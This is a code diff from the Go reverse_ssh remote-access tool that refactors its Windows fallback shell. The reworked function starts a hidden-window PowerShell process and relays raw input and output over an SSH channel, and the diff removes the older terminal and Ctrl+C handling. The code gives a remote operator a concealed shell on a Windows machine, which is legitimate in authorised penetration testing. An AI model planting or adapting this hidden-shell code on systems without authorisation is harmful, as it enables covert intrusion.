@@ -8,12 +8,10 @@ import (
 	"io"
 	"os"
 	"os/exec"
-	"os/signal"
 	"syscall"
 
 	"github.com/ActiveState/termtest/conpty"
 	"github.com/NHAS/reverse_ssh/internal"
-	"github.com/NHAS/reverse_ssh/internal/terminal"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
 	"github.com/NHAS/reverse_ssh/pkg/winpty"
 	"golang.org/x/crypto/ssh"
@@ -111,24 +109,6 @@ func conptyShell(connection ssh.Channel, reqs <-chan *ssh.Request, log logger.Lo
 
 func basicShell(connection ssh.Channel, reqs <-chan *ssh.Request, log logger.Logger) {
 
-	c := make(chan os.Signal, 1)
-	expected := make(chan bool, 1)
-
-	signal.Notify(c, os.Interrupt)
-	signal.Notify(c, syscall.SIGTERM)
-
-	go func() {
-		for {
-			select {
-			case <-c:
-				os.Exit(0)
-			case <-expected:
-				<-c
-
-			}
-		}
-	}()
-
 	cmd := exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo")
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 
@@ -138,6 +118,8 @@ func basicShell(connection ssh.Channel, reqs <-chan *ssh.Request, log logger.Log
 	stdout, err := cmd.StdoutPipe()
 	if err != nil {
 		log.Error("%s", err)
+		fmt.Fprint(connection, "Unable to open stdout pipe")
+
 		return
 	}
 
@@ -146,27 +128,23 @@ func basicShell(connection ssh.Channel, reqs <-chan *ssh.Request, log logger.Log
 	stdin, err := cmd.StdinPipe()
 	if err != nil {
 		log.Error("%s", err)
+		fmt.Fprint(connection, "Unable to open stdin pipe")
 		return
 	}
 
-	term := terminal.NewTerminal(connection, "")
-	// Dynamically handle resizes of terminal window
-	go func() {
-		for req := range reqs {
-			switch req.Type {
+	err = cmd.Start()
+	if err != nil {
+		log.Error("%s", err)
+		fmt.Fprint(connection, "Could not start powershell")
 
-			case "window-change":
-				w, h := internal.ParseDims(req.Payload)
-				term.SetSize(int(w), int(h))
+	}
 
-			}
-
-		}
-	}()
+	go ssh.DiscardRequests(reqs)
 
 	go func() {
 
 		buf := make([]byte, 128)
+		defer connection.Close()
 
 		for {
 
@@ -178,78 +156,42 @@ func basicShell(connection ssh.Channel, reqs <-chan *ssh.Request, log logger.Log
 				return
 			}
 
-			//This should ignore the echo'd result from cmd.exe on newline, this isnt super thread safe, but should be okay.
-			_, err = term.Write(buf[:n])
+			_, err = connection.Write(buf[:n])
 			if err != nil {
 				log.Error("%s", err)
 				return
 			}
-
 		}
 	}()
 
 	go func() {
+		buf := make([]byte, 128)
+		defer connection.Close()
 
 		for {
-			//This will break if the user does CTRL+D apparently we need to reset the whole terminal if a user does this.... so just exit instead
-			line, err := term.ReadLine()
-			if err != nil && err != terminal.ErrCtrlC {
-				log.Error("%s", err)
+			n, err := connection.Read(buf)
+			if err != nil {
+				if err != io.EOF {
+					log.Error("%s", err)
+				}
 				return
 			}
 
-			if err == terminal.ErrCtrlC {
-				expected <- true
-				err := sendCtrlC(cmd.Process.Pid)
-				if err != nil {
-					fmt.Fprintf(term, "Failed to send Ctrl+C sorry! You are most likely trapped: %s", err)
+			_, err = stdin.Write(buf[:n])
+			if err != nil {
+				if err != io.EOF {
 					log.Error("%s", err)
 				}
-			}
-
-			if err == nil {
-				_, err := stdin.Write([]byte(line + "\r\n"))
-				if err != nil {
-					fmt.Fprintf(term, "Error writing to STDIN: %s", err)
-					log.Error("%s", err)
-				}
+				return
 			}
 
 		}
-
 	}()
 
-	err = cmd.Run()
+	err = cmd.Wait()
 	if err != nil {
 		log.Error("%s", err)
 	}
-}
 
-func sendCtrlC(pid int) error {
-
-	d, e := syscall.LoadDLL("kernel32.dll")
-
-	if e != nil {
-
-		return fmt.Errorf("LoadDLL: %v\n", e)
-
-	}
-
-	p, e := d.FindProc("GenerateConsoleCtrlEvent")
-
-	if e != nil {
-
-		return fmt.Errorf("FindProc: %v\n", e)
-
-	}
-	r, _, e := p.Call(syscall.CTRL_C_EVENT, uintptr(pid))
-
-	if r == 0 {
-
-		return fmt.Errorf("GenerateConsoleCtrlEvent: %v\n", e)
-
-	}
-
-	return nil
-
+	connection.Close()
 }
